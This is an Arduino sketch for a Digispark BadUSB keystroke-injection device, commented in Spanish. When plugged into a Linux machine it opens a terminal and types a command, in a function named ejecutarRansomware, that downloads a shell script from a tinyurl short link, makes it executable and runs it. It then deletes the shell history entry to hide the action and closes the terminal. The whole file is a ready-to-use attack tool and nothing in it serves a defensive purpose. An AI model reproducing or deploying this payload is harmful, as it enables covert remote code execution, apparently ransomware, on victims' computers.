#include <DigiKeyboard.h>

void setup() {
  pinMode(1, OUTPUT); // Configura el pin 0 como salida
  
  // Espera un momento para asegurarse de que el sistema está listo
  DigiKeyboard.delay(800);

  abrirTerminal();

  ejecutarRansomware();

  cerrarTerminal();
}

void abrirTerminal() {
  // Enviar Ctrl + Alt + T para abrir la terminal
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(400); // Esperar a que se abra la terminal
}

void cerrarTerminal() {
  // Enviar Ctrl + D para cerrar la terminal
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_CONTROL_LEFT);
}

void ejecutarRansomware() {
  // curl -O https://tinyurl.com/jkmnc7 && chmod +x s.sh && ./s.sh
  DigiKeyboard.print("curl ");
  DigiKeyboard.sendKeyStroke(KEY_SLASH);
  DigiKeyboard.print("L ");
  DigiKeyboard.sendKeyStroke(KEY_SLASH);
  DigiKeyboard.print("o s.sh https");
  DigiKeyboard.sendKeyStroke(KEY_PERIOD, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.print("tinyurl.com");
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.print("jkmnc7 ");
  DigiKeyboard.sendKeyStroke(KEY_6, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_6, MOD_SHIFT_LEFT);
  DigiKeyboard.print(" chmod ");
  DigiKeyboard.sendKeyStroke(87);
  DigiKeyboard.print("x s.sh ");
  DigiKeyboard.sendKeyStroke(KEY_6, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_6, MOD_SHIFT_LEFT);
  DigiKeyboard.print(" .");
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.print("s.sh");

  // Borrar historial: history -d $(history 1)
  DigiKeyboard.sendKeyStroke(0x36, MOD_SHIFT_LEFT);
  DigiKeyboard.print(" history ");
  DigiKeyboard.sendKeyStroke(KEY_SLASH);
  DigiKeyboard.print("d ");
  DigiKeyboard.sendKeyStroke(KEY_4, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);
  DigiKeyboard.print("history 1");
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);

  // Presionar Enter
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
}

void loop() {
  digitalWrite(1, HIGH); // Enciende el LED
  delay(3000);           // Espera 3 segundo (3000 milisegundos)
  digitalWrite(1, LOW);  // Apaga el LED
  delay(3000);           // Espera 3 segundo
}
